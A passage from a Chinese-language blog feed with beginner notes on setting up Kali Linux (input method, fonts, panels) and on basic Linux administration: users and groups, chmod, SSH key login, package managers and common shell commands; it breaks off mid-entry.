class="headerlink" title="安装中文输入法"></a><strong>安装中文输入法</strong></h1><ol><li><p>更新包管理器的软件包列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure></li><li><p>安装<code>fcitx</code>输入法框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install fcitx</span><br></pre></td></tr></table></figure></li><li><p>安装<code>fcitx-googlepinyin</code>谷歌拼音输入法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install fcitx-googlepinyin</span><br></pre></td></tr></table></figure></li></ol><p><code>ctrl</code>+<code>space(空格)</code>切换输入法</p><h1 id="界面美化"><a href="#界面美化" class="headerlink" title="界面美化"></a><strong>界面美化</strong></h1><h2 id="1-整体字体放大"><a href="#1-整体字体放大" class="headerlink" title="1.整体字体放大"></a>1.整体字体放大</h2><ul><li>打开左上角kali图标</li><li>点击<strong>设置</strong>进入<strong>外观</strong></li><li>选择<strong>字体</strong>，修改<strong>DPI</strong></li></ul><h2 id="1-桌面图标大小"><a href="#1-桌面图标大小" class="headerlink" title="1.桌面图标大小"></a>1.桌面图标大小</h2><ul><li>桌面<strong>右键</strong>选择<strong>桌面设置</strong></li><li>选择<strong>图标</strong>，调节<strong>图标大小</strong>完成对桌面图标的调节。（这步也可以设置图标下的字体 自定义大小）</li></ul><h2 id="2-菜单栏大小以及位置"><a href="#2-菜单栏大小以及位置" class="headerlink" title="2.菜单栏大小以及位置"></a>2.菜单栏大小以及位置</h2><ul><li>在菜单栏空白处右键—选择<strong>面板</strong>再点击<strong>面板首选项</strong></li><li>打开面板后选择<strong>显示</strong>—<strong>尺寸</strong>—调节<strong>行大小</strong></li><li><strong>关闭锁定面板</strong>，可拖动作用两侧的小点将面板放置于最下侧</li></ul><h2 id="3-终端字体"><a href="#3-终端字体" class="headerlink" title="3.终端字体"></a>3.终端字体</h2><ul><li>打开<strong>终端</strong>再点击左上角<strong>文件</strong>点击<strong>参数设置</strong></li><li>打开<strong>设置界面</strong>，<strong>界面设置</strong>—调节<strong>字体</strong>大小</li></ul><h2 id="4-系统字体"><a href="#4-系统字体" class="headerlink" title="4.系统字体"></a>4.系统字体</h2><ul><li>打开左上角kali图标</li><li>点击<strong>设置</strong>进入<strong>外观</strong></li><li>选择<strong>字体</strong>，修改<strong>默认字体</strong>和<strong>默认等宽字体</strong></li></ul><h2 id="4-窗口字体"><a href="#4-窗口字体" class="headerlink" title="4.窗口字体"></a>4.窗口字体</h2><ul><li>打开左上角kali图标</li><li>点击<strong>设置</strong>进入<strong>窗口管理器</strong></li><li>选择<strong>样式</strong>修改<strong>标题字体</strong></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;kali解压打开默认密码为：kali&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;设置中文&quot;&gt;&lt;a href=&quot;#设置中文&quot; class=&quot;headerlink&quot; title=&quot;设置中文&quot;&gt;&lt;/a&gt;&lt;strong&gt;设置中文&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;打开</summary>
      
    
    
    
    <category term="解决方案" scheme="https://we11s.github.io/categories/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    
    
    <category term="Tools" scheme="https://we11s.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Linux笔记</title>
    <link href="https://we11s.github.io/posts/1406167115/"/>
    <id>https://we11s.github.io/posts/1406167115/</id>
    <published>2023-12-25T14:22:26.000Z</published>
    <updated>2024-05-29T17:55:03.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a><strong>用户管理</strong></h1><h2 id="创建指令"><a href="#创建指令" class="headerlink" title="创建指令"></a>创建指令</h2><p>通常是<code>useradd</code>或<code>adduser</code></p><ol><li><h3 id="使用useradd命令："><a href="#使用useradd命令：" class="headerlink" title="使用useradd命令："></a>使用<code>useradd</code>命令：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd 选项 用户名</span><br></pre></td></tr></table></figure><ul><li>选项:<ul><li>-c comment 指定一段注释性描述。</li><li>-d 目录 指定用户主目录（如果已存在）。如果此目录不存在，则同时使用-m选项，可以创建主目录。如：<code>sudo useradd –d  /home/sam -m sam</code></li><li>-g 用户组 指定用户所属的用户组。</li><li>-G 用户组，用户组 指定用户所属的附加组。</li><li>-s Shell文件 指定用户的登录Shell。</li><li>-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。</li></ul></li></ul></li><li><h3 id="使用adduser命令："><a href="#使用adduser命令：" class="headerlink" title="使用adduser命令："></a>使用<code>adduser</code>命令：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser 用户名</span><br></pre></td></tr></table></figure></li></ol><p>创建用户后，系统会自动为该用户分配一个默认的主目录和用户组。</p><h2 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h2><p><code>passwd</code>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd 选项 用户名</span><br></pre></td></tr></table></figure><p>选项：</p><ul><li>-l 锁定口令，即禁用账号。</li><li>-u 口令解锁。</li><li>-d 使账号无口令。</li><li>-f 强迫用户下次登录时修改口令。</li></ul><h2 id="修改帐号"><a href="#修改帐号" class="headerlink" title="修改帐号"></a>修改帐号</h2><p><code>usermod</code>命令，其格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod 选项 用户名</span><br></pre></td></tr></table></figure><p>常用的选项包括<code>-c, -d, -m, -g, -G, -s, -u以及-o等</code>，这些选项的意义与<code>useradd</code>命令中的选项一样，可以为用户指定新的资源值。</p><p>另外，有些系统可以使用选项：<code>-l</code> 新用户名</p><p>这个选项指定一个新的账号，即将原来的用户名改为新的用户名。</p><h2 id="删除帐号"><a href="#删除帐号" class="headerlink" title="删除帐号"></a>删除帐号</h2><p><code>userdel</code>命令，其格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel 选项 用户名</span><br></pre></td></tr></table></figure><p>常用的选项是 <code>-r</code>，它的作用是把用户的主目录一起删除。</p><h1 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a><strong>用户组管理</strong></h1><h2 id="增加用户组"><a href="#增加用户组" class="headerlink" title="增加用户组"></a>增加用户组</h2><p><code>groupadd</code>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd 选项 用户组</span><br></pre></td></tr></table></figure><p>选项：</p><ul><li>-g GID 指定新用户组的组标识号（GID）。</li><li>-o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。</li></ul><h2 id="删除用户组"><a href="#删除用户组" class="headerlink" title="删除用户组"></a>删除用户组</h2><p><code>groupdel</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupdel 用户组</span><br></pre></td></tr></table></figure><h2 id="修改用户组"><a href="#修改用户组" class="headerlink" title="修改用户组"></a>修改用户组</h2><p><code>groupmod</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupmod 选项 用户组</span><br></pre></td></tr></table></figure><p>选项：</p><ul><li>-g GID 为用户组指定新的组标识号。</li><li>-o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。</li><li>-n新用户组 将用户组的名字改为新名字</li></ul><h2 id="用户在用户组之间切换"><a href="#用户在用户组之间切换" class="headerlink" title="用户在用户组之间切换"></a>用户在用户组之间切换</h2><p><code>newgrp</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newgrp root</span><br></pre></td></tr></table></figure><p>（前提条件是root用户组确实是该用户的主组或附加组）这条命令将当前用户切换到root用户组，</p><h1 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a><strong>权限控制</strong></h1><h2 id="授予用户sudo权限"><a href="#授予用户sudo权限" class="headerlink" title="授予用户sudo权限"></a>授予用户sudo权限</h2><p>用户到sudo用户组：</p><ul><li><p>在某些Linux发行版中，可以将用户添加到sudo用户组来赋予其sudo权限。</p></li><li><p>使用以下命令将用户添加到sudo用户组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG sudo 用户名</span><br></pre></td></tr></table></figure></li></ul><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><p><strong>文件权限位包括读取（read）、写入（write）和执行（execute）权限。</strong></p><ul><li>读取权限（r）允许用户查看文件内容和属性。</li><li>写入权限（w）允许用户修改文件内容和属性。</li><li>执行权限（x）允许用户以可执行文件的形式运行文件（例如，脚本或可执行程序）或进入目录。</li></ul><p>每个文件都有三组权限位，分别对应文件的<strong>所有者、用户组和其他用户</strong>。</p><h3 id="更改文件权限"><a href="#更改文件权限" class="headerlink" title="更改文件权限"></a>更改文件权限</h3><p> <code>chmod</code> 命令可以更改文件的权限</p><h4 id="数字模式："><a href="#数字模式：" class="headerlink" title="数字模式："></a>数字模式：</h4><p>可以使用三个八进制数字（0-7）来表示权限位。每个数字代表一个权限组，分别表示所有者、用户组和其他用户的权限。</p><ul><li>每个权限位用一个数字表示，对应的值为：<ul><li>r：4             w：2               x：1                   -：0</li></ul></li><li>将三个权限位的数字相加，得到一个三位数，例如：<ul><li>rwx：4 + 2 + 1 &#x3D; 7</li><li>rw-：4 + 2 + 0 &#x3D; 6</li><li>r–：4 + 0 + 0 &#x3D; 4</li><li>—：0 + 0 + 0 &#x3D; 0</li></ul></li></ul><h4 id="符号模式："><a href="#符号模式：" class="headerlink" title="符号模式："></a>符号模式：</h4><p>可以使用 <code>+</code>、<code>-</code> 和 <code>=</code> 符号来添加、移除或设置权限。符号前表示用户u（所有者）、g（用户组）、o（其他用户）、a（所有用户），后表示所操作的权限。</p><ol><li>给予读取权限：<ul><li>给予所有者读取权限：<code>chmod u+r 文件名</code></li><li>给予用户组读取权限：<code>chmod g+r 文件名</code></li><li>给予其他用户读取权限：<code>chmod o+r 文件名</code></li><li>给予所有用户（包括所有者、用户组和其他用户）读取权限：<code>chmod a+r 文件名</code></li></ul></li><li>给予写入权限：<ul><li>给予所有者写入权限：<code>chmod u+w 文件名</code></li><li>给予用户组写入权限：<code>chmod g+w 文件名</code></li><li>给予其他用户写入权限：<code>chmod o+w 文件名</code></li><li>给予所有用户写入权限：<code>chmod a+w 文件名</code></li></ul></li><li>给予执行权限：<ul><li>给予所有者执行权限：<code>chmod u+x 文件名</code></li><li>给予用户组执行权限：<code>chmod g+x 文件名</code></li><li>给予其他用户执行权限：<code>chmod o+x 文件名</code></li><li>给予所有用户执行权限：<code>chmod a+x 文件名</code></li></ul></li></ol><h1 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a><strong>远程登录</strong></h1><p>Linux 系统中是通过 ssh 服务实现的远程登录功能，默认 ssh 服务端口号为 22</p><p>第一种级别（基于口令的安全验证）：只要你知道自己帐号和口令，就可以登录到远程主机。</p><p>第二种级别（基于密钥的安全验证）：你必须为自己创建一对密钥，并把公钥放在需要访问的服务器上。</p><h2 id="密钥连接"><a href="#密钥连接" class="headerlink" title="密钥连接"></a>密钥连接</h2><h3 id="1-生成ssh-key的文件"><a href="#1-生成ssh-key的文件" class="headerlink" title="1.生成ssh key的文件"></a>1.生成ssh key的文件</h3><p>windows 用户可以使用 <strong>WSL</strong>，或使用 <strong>Git Bash</strong>进行执行命令</p><p><code>ssh-keygen</code> 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen 参数</span><br></pre></td></tr></table></figure><p>可选参数：</p><ul><li><code>-t</code>：指定密钥类型。常见的选项包括 <code>rsa</code>、<code>dsa</code>、<code>ecdsa</code> 和 <code>ed25519</code>。默认为 <code>rsa</code>。</li><li><code>-b</code>：指定密钥位数。默认为 2048 位。常见的选项包括 1024、2048、4096。</li><li><code>-C</code>：添加注释。可以在生成的公钥文件中添加一段注释，用于标识该密钥的用途或所有者等信息。</li><li><code>-f</code>：指定生成的密钥文件名。可以自定义密钥文件的名称和路径。</li><li><code>-N</code>：设置密码短语（passphrase）。可以为私钥文件设置密码短语，以增加安全性。</li><li><code>-q</code>：静默模式。生成密钥时不显示进度或警告信息。</li><li><code>-y</code>：从私钥文件中提取公钥。可以使用私钥文件生成对应的公钥文件。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">XiaoWei@XiaoWEI MINGW64 ~/.ssh</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh-keygen -t rsa -b 4096 -f aliyun_rsa</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase (empty for no passphrase):  //如果不想在之后登录的时候还需要输入密码请直接回车</span><br><span class="line">Enter same passphrase again:   //如果不想在之后登录的时候还需要输入密码请直接回车</span><br><span class="line">Your identification has been saved in aliyun_rsa</span><br><span class="line">Your public key has been saved in aliyun_rsa.pub</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><p>密钥用于鉴权，请谨慎保管。<strong>公钥文件以 .pub 扩展名结尾，可以公开给其他人</strong>，而<strong>没有 .pub 扩展名的私钥文件不要泄露给任何人！</strong></p><h3 id="2-部署公钥到服务器"><a href="#2-部署公钥到服务器" class="headerlink" title="2.部署公钥到服务器"></a>2.部署公钥到服务器</h3><ol><li><p>创建 SSH 目录和授权文件：在目标服务器上，如果尚未存在，请创建 <code>.ssh</code> 目录，并将其权限设置为 <code>700</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.ssh</span><br><span class="line">chmod 700 ~/.ssh</span><br></pre></td></tr></table></figure></li><li><p>添加公钥到授权文件：将公钥粘贴到服务器上的 <code>~/.ssh/authorized_keys</code> 文件中。如果该文件不存在，请创建它，并将其权限设置为 <code>600</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.ssh/authorized_keys</span><br><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li><li><p>保存并退出：保存对 <code>authorized_keys</code> 文件的更改，并退出服务器。</p></li></ol><h3 id="3-更改配置文件"><a href="#3-更改配置文件" class="headerlink" title="3.更改配置文件"></a>3.更改配置文件</h3><p>有些Linux可能默认禁止ssl的密钥登录</p><ol><li><p>SSH 配置文件位于 <code>/etc/ssh/sshd_config</code>，可使用以下命令进行配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>如果您只想更改用户级别的 SSH 配置，可以编辑 <code>~/.ssh/config</code> 文件。</p></li><li><p>在配置文件中，常见的 SSH 配置选项：</p><ul><li><code>Port</code>：指定 SSH 服务器监听的端口号。</li><li><code>PermitRootLogin</code>：允许或禁止使用 root 用户进行 SSH 登录。</li><li><code>PasswordAuthentication</code>：允许或禁止使用密码进行身份验证。</li><li><strong><code>PubkeyAuthentication</code>：允许或禁止使用公钥进行身份验证。</strong></li><li><code>AllowUsers</code> 或 <code>AllowGroups</code>：限制允许登录的用户或组。</li><li><code>DenyUsers</code> 或 <code>DenyGroups</code>：禁止登录的用户或组。</li><li><code>PrintMotd</code>：显示登录时的欢迎信息。</li><li><code>Banner</code>：指定自定义的登录横幅文件。</li></ul></li></ol><h3 id="4-本机ssh的config设置（快捷登录）"><a href="#4-本机ssh的config设置（快捷登录）" class="headerlink" title="4.本机ssh的config设置（快捷登录）"></a>4.本机ssh的config设置（快捷登录）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Host 名称(自己决定，方便输入记忆的)</span><br><span class="line">    HostName 主机名 #172.16.8.152</span><br><span class="line">    User root # SSH 连接的用户名</span><br><span class="line">    # Port 29172 端口 默认22</span><br><span class="line">    # PreferredAuthentications publickey,password  # 选项publickey/password/publickey,password  设置首选的身份验证方法，先尝试公钥验证，然后尝试密码验证</span><br><span class="line">    # IdentityFile ~/.ssh/work_id_rsa  # 使用的身份验证密钥文件路径</span><br><span class="line">    # ForwardAgent yes  # 启用 SSH 代理转发</span><br><span class="line">    # ForwardX11 yes  # 启用 X11 转发</span><br><span class="line">    # Compression yes  # 启用连接压缩</span><br><span class="line">    # StrictHostKeyChecking yes  # 设置主机密钥检查级别为严格检查</span><br><span class="line">    # LogLevel VERBOSE  # 设置 SSH 客户端的日志级别为详细模式</span><br><span class="line">    # ServerAliveInterval 60  # 设置 SSH 连接的保活机制，每60秒发送保活消息</span><br><span class="line">    # ServerAliveCountMax 3  # 设置 SSH 连接的保活机制，最多发送3个保活消息</span><br><span class="line">    # ProxyJump jumpbox  # 使用跳板机（代理主机）访问目标主机</span><br></pre></td></tr></table></figure><h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a><strong>软件安装</strong></h1><ol><li><h2 id="Ubuntu-Debian"><a href="#Ubuntu-Debian" class="headerlink" title="Ubuntu&#x2F;Debian:"></a>Ubuntu&#x2F;Debian:</h2><ul><li>使用APT包管理器：<ul><li>安装软件：<code>sudo apt-get install 软件名称</code></li><li>卸载软件：<code>sudo apt-get remove 软件名称</code></li><li>更新软件包列表：<code>sudo apt-get update</code></li><li>升级已安装的软件包：<code>sudo apt-get upgrade</code></li></ul></li></ul></li><li><h2 id="CentOS-RHEL-Fedora"><a href="#CentOS-RHEL-Fedora" class="headerlink" title="CentOS&#x2F;RHEL&#x2F;Fedora:"></a>CentOS&#x2F;RHEL&#x2F;Fedora:</h2><ul><li>使用YUM包管理器：<ul><li>安装软件：<code>sudo yum install 软件名称</code></li><li>卸载软件：<code>sudo yum remove 软件名称</code></li><li>更新软件包列表：<code>sudo yum update</code></li><li>升级已安装的软件包：<code>sudo yum upgrade</code></li></ul></li></ul></li><li><h2 id="Alpine-Linux"><a href="#Alpine-Linux" class="headerlink" title="Alpine Linux:"></a>Alpine Linux:</h2><ul><li><p>使用apk包管理器：</p><ul><li><p>安装软件：<code>apk add 软件名称</code></p></li><li><p>卸载软件：<code>apk del 软件名称</code></p></li><li><p>更新软件包列表：<code>apk update</code></p></li><li><p>升级已安装的软件包：<code>apk upgrade</code></p></li></ul></li></ul></li></ol><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="1-目录符号"><a href="#1-目录符号" class="headerlink" title="1.目录符号"></a>1.目录符号</h3><p> <code>/</code> 表示从 <strong>根目录</strong></p><p><code>~</code>表示从 <strong>家目录</strong>(即&#x2F;home&#x2F;<em>用户名</em>，root用户为<code>/root</code>)</p><p><code>.</code> 代表当前目录</p><p><code>..</code> 代表上一级目录</p><h3 id="2-绝对目录与相对目录"><a href="#2-绝对目录与相对目录" class="headerlink" title="2.绝对目录与相对目录"></a>2.绝对目录与相对目录</h3><p><strong>相对路径</strong> 在输入路径时，使用<code>.</code>或者<code>..</code>，表示相对 当前目录 所在的目录位置 </p><p><strong>绝对路径</strong> 在输入路径时，最前面是 &#x2F; 或者 ~，表示从 <strong>根目录&#x2F;家目录</strong> 开始的具体目录位置，特点：需要写入完整地址</p><h3 id="3-和-重定向-命令"><a href="#3-和-重定向-命令" class="headerlink" title="3.&gt; 和 &gt;&gt;重定向 命令"></a>3.<code>&gt;</code> 和 <code>&gt;&gt;</code>重定向 命令</h3><p>功能：将命令执行结果<strong>重定向</strong>到一个文件，将本应显示在终端上的内容 输出或追加 到指定文件中</p><p> <code>&gt;</code> 表示输出，会覆盖文件原有的内容 </p><p><code>&gt;&gt;</code> 表示追加，会将内容追加到已有文件的末尾</p><h3 id="4-管道符"><a href="#4-管道符" class="headerlink" title="4.|管道符"></a>4.<code>|</code>管道符</h3><ul><li>Linux 允许将 一个命令的输出 可以通过管道<code>|</code> 做为 另一个命令的输入</li><li>这里 | 的左右分为两端， 左端塞东西（写），右端取东西（读）</li></ul><h2 id="pwd-命令"><a href="#pwd-命令" class="headerlink" title="pwd 命令"></a><code>pwd</code> 命令</h2><p>对应单词：print working directory</p><p>功能：打印当前工作目录</p><h2 id="ls-命令"><a href="#ls-命令" class="headerlink" title="ls 命令"></a><code>ls</code> 命令</h2><p>对应单词：list</p><p>功能：<strong>列出目录的内容</strong>或者使用通配符<strong>列出文件名匹配的文件</strong></p><p>格式:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls [参数]</span><br></pre></td></tr></table></figure><p>可选参数</p><table><thead><tr><th>-a</th><th>显示指定目录下所有目录与文件，包括隐藏文件</th></tr></thead><tbody><tr><td>-l</td><td>以列表方式显示文件的详细信息</td></tr><tr><td>-h</td><td>配合 -l 以人性化的方式显示文件大小</td></tr></tbody></table><p>注意：以 <code>.</code> 开头的文件为隐藏文件，需要用 -a 参数才能显示</p><h2 id="find-命令"><a href="#find-命令" class="headerlink" title="find 命令"></a><code>find</code> 命令</h2><p>对应单词：find</p><p>功能：指定目录及其子目录下查找文件和目录</p><p>格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find [路径] [匹配条件] [动作]</span><br></pre></td></tr></table></figure><p>常用的匹配条件：</p><table><thead><tr><th>可选匹配条件</th><th>作用</th></tr></thead><tbody><tr><td>-name</td><td>按文件名查找，支持使用通配符 <code>*</code> 和 <code>?</code></td></tr><tr><td>-type</td><td>按文件类型查找，可以是 <code>f</code>（普通文件）、<code>d</code>（目录）、<code>l</code>（符号链接）等。</td></tr><tr><td>-size[+-]</td><td>按文件大小查找，支持使用 <code>+</code> 或 <code>-</code> 表示大于或小于指定大小，单位可以是 <code>c</code>（字节）、<code>w</code>（字数）、<code>b</code>（块数）、<code>k</code>（KB）、<code>M</code>（MB）或 <code>G</code>（GB）。</td></tr><tr><td>-mtime</td><td>按修改时间查找，支持使用 <code>+</code> 或 <code>-</code> 表示在指定天数前或后，days 是一个整数表示天数。</td></tr><tr><td>-user</td><td>按文件所有者查找。</td></tr><tr><td>-group</td><td>按文件所属组查找。</td></tr></tbody></table><h2 id="cd-命令"><a href="#cd-命令" class="headerlink" title="cd 命令"></a><code>cd</code> 命令</h2><p>对应单词：change directory</p><p>功能：<strong>更改当前的工作目录</strong></p><p>格式:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd 目录</span><br></pre></td></tr></table></figure><p><code>cd</code>搭配符号</p><table><thead><tr><th align="left">命令</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>cd</code>  &#x2F;<code>cd ~</code></td><td align="left">切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)</td></tr><tr><td align="left">cd .</td><td align="left">保持在当前目录不变</td></tr><tr><td align="left">cd ..</td><td align="left">切换到上级目录</td></tr><tr><td align="left">cd –</td><td align="left">可以在最近两次工作目录之间来回切换</td></tr></tbody></table><h2 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a><code>touch</code>命令</h2><p>功能：</p><ul><li>如果文件不存在，可以创建一个空白文件 </li><li>如果文件已经存在，可以修改文件的末次修改日期</li></ul><h2 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a><code>mkdir</code>命令</h2><p>对应单词：make directory</p><p>功能：创建一个新的目录</p><table><thead><tr><th align="left">选项</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">-p</td><td align="left">创建多级目录<br />需要创建一个目录的同时，也需要创建其上级目录（如果上级目录不存在）</td></tr></tbody></table><p>注意：新建目录的名称 不能与当前目录中 已有的目录同名</p><h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a><code>rm</code>命令</h2><p>对应单词：remove</p><p>功能：删除文件或目录</p><table><thead><tr><th align="left">可选参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">-f</td><td align="left">强制删除，忽略不存在的文件，无需提示</td></tr><tr><td align="left">-r</td><td align="left">递归地删除目录下的内容，<strong>删除文件夹时必须加此参数</strong></td></tr></tbody></table><h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a><code>cp</code>命令</h2><p>对应单词：copy</p><p>功能：复制文件或者目录</p><table><thead><tr><th align="left">可选参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">-i</td><td align="left">覆盖文件前提示</td></tr><tr><td align="left">-r</td><td align="left">若给出的源文件是目录文件，则 cp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名</td></tr></tbody></table><h2 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a><code>mv</code>命令</h2><p>对应单词：move</p><p>功能：移动文件或者目录／文件或者目录重命名</p><table><thead><tr><th align="left">可选参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">-i</td><td align="left">覆盖文件前提示</td></tr></tbody></table><h2 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a><code>cat</code>命令</h2><p>对应单词：  concatenate</p><p>功能：查看文件内容、创建文件、文件合并、追加文件内容等功能.,适合查看内容较少的文本文件</p><table><thead><tr><th align="left">可选参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">-b</td><td align="left">对非空输出行编号</td></tr><tr><td align="left">-n</td><td align="left">对输出的所有行编号</td></tr></tbody></table><h2 id="more命令"><a href="#more命令" class="headerlink" title="more命令"></a><code>more</code>命令</h2><p>对应单词：  more</p><p>功能：  分屏显示文件内容</p><p>使用 more 的操作键：</p><table><thead><tr><th align="left">操作键</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">空格键</td><td align="left">显示手册页的下一屏</td></tr><tr><td align="left">Enter</td><td align="left">键 一次滚动手册页的一行</td></tr><tr><td align="left">b</td><td align="left">回滚一屏</td></tr><tr><td align="left">f</td><td align="left">前滚一屏</td></tr><tr><td align="left">q</td><td align="left">退出</td></tr><tr><td align="left">&#x2F;word</td><td align="left">搜索 word 字符串</td></tr></tbody></table><h2 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a><code>echo</code>命令</h2><p>对应单词：  more</p><p>功能：  在终端中显示参数指定的文字，通常会和重定向联合使用</p><h2 id="进程命令"><a href="#进程命令" class="headerlink" title="进程命令"></a>进程命令</h2><h3 id="ps命令："><a href="#ps命令：" class="headerlink" title="ps命令："></a><code>ps</code>命令：</h3><p>英文：  process status </p><p>作用：显示当前正在运行的进程的快照。</p><table><thead><tr><th align="left">命令</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">ps aux</td><td align="left">查看进程的详细状况</td></tr><tr><td align="left">ps -ef</td><td align="left">显示所有进程的完整信息</td></tr><tr><td align="left">ps 进程代号</td><td align="left">显示特定进程代号的详细信息</td></tr><tr><td align="left">top</td><td align="left"></td></tr><tr><td align="left">kill [-9] 进程代号</td><td align="left">终止指定代号的进程， -9 表示强行终止</td></tr></tbody></table><p><code>ps</code> 默认只会显示当前用户通过终端启动的应用程序 ps 选项说明</p><table><thead><tr><th align="left">选项</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">a</td><td align="left">显示终端上的所有进程，包括其他用户的进程</td></tr><tr><td align="left">u</td><td align="left">显示进程的详细状态</td></tr><tr><td align="left">x</td><td align="left">显示没有控制终端的进程</td></tr></tbody></table><h3 id="top命令："><a href="#top命令：" class="headerlink" title="top命令："></a><code>top</code>命令：</h3><p>作用：  动态显示运行中的进程并且可以按 CPU 使用率、内存使用率等对进程进行排序</p><p>输入 <code>q</code>退出 <code>top</code> 命令界面</p><h3 id="kill命令："><a href="#kill命令：" class="headerlink" title="kill命令："></a><code>kill</code>命令：</h3><p>作用：  向进程发送信号以终止或操作进程</p><p>常见用法</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>kill 进程代号</td><td>向指定进程代号的进程发送默认的终止信号</td></tr><tr><td>kill -9 进程代号</td><td>向指定进程代号的进程发送强制终止信号</td></tr></tbody></table><p>提示：使用 kill 命令时，最好只终止由当前用户开启的进程，而不要终止 root 身份开启的进程，否则可能导致系统崩溃</p><h3 id="pgrep命令："><a href="#pgrep命令：" class="headerlink" title="pgrep命令："></a><code>pgrep</code>命令：</h3><p>作用：  向进程发送信号以终止或操作进程</p><figure 